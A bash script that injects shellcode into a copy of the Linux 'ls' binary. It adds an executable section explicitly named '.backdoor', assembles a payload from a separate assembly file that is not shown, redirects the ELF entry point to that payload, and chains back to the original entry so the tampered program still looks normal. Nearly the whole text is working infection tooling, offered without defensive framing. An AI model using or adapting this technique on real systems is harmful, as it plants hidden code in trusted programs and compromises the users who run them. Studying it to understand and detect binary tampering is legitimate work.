#!/bin/bash
rm injected_ls
cp /bin/ls .
mv ./ls injected_ls

# Generate 100bytes of nops
seq 100 | xargs -i bash -c 'echo -ne "\x90" >> nopsection' 

# Add section and make it rwx
objcopy --add-section .backdoor=nopsection --set-section-flags .backdoor=alloc,load,code injected_ls 
objcopy --adjust-section-vma .backdoor=0xbeef injected_ls
rm nopsection
#https://reverseengineering.stackexchange.com/questions/14779/how-to-successfully-add-a-code-section-to-an-executable-file-in-linux


# Storing original entrypoint
ENTRYPOINT=$(readelf -a injected_ls | grep Entry | cut -d : -f 2 | sed 's/^\s\+//g')
echo "Original entry=$ENTRYPOINT"


# Generating payload
sed  "s/.*;ENTRY/  jmp $ENTRYPOINT  ;ENTRY/g" -i test.asm
nasm test.asm -o test.o -f elf64
shellcode=$(objdump -d test.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d ' '| tr -s ' '| tr '\t' ' '| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s )
echo -ne $shellcode > shellcode



## Calculating offset to write jmp to entry
#size of shellcode
sc_size=$(wc -c shellcode| cut -d\  -f 1)
echo $sc_size

#offset to write jmp entry
offset=`python -c "print hex(int($sc_size) + 0xbeef)"` 
echo $offset


# Changing Entry and injecting payload
r2 -c "0x18; oo+;wx efbe;0xbeef;wff ./shellcode; $offset;\"wa jmp $ENTRYPOINT \"; 0xbeef; pd 20" injected_ls
#r2 -c "0x18; oo+;wx efbe;0xbeef; \"wa nop;nop;nop;push rax; push rbx; pop rbx; pop rax; jmp $ENTRYPOINT\"" injected_ls
